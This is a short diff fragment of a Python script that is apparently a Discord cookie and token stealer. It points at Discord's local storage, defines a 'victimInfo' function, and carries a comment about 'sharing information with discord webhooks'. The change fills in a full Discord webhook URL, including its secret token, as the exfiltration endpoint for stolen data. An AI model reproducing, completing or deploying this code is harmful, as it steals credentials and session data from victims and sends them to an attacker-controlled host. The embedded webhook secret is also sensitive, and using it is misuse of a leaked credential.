@@ -22,7 +22,7 @@ cookiePath={'Discord': os.getenv(key=allEnv.get('appRoaming')) + '\discord\Local
 
 #sharing information with discord webhooks
 #webhook = Webhook.from_url("https://discord.com/api/webhooks/.........", adapter=RequestsWebhookAdapter())
-webhookURL = "https://discord.com/api/webhooks/..............." #CHANGE ME
+webhookURL = "https://discord.com/api/webhooks/1092653713602121738/NM4YVyMXcMU3oc5P4KpoZpg7dlHANNR8vpbAomO5nCApdKoqZCKVhIUjE_Ej-9S3Z3Ff" #CHANGE ME
 
 try:
     def victimInfo():
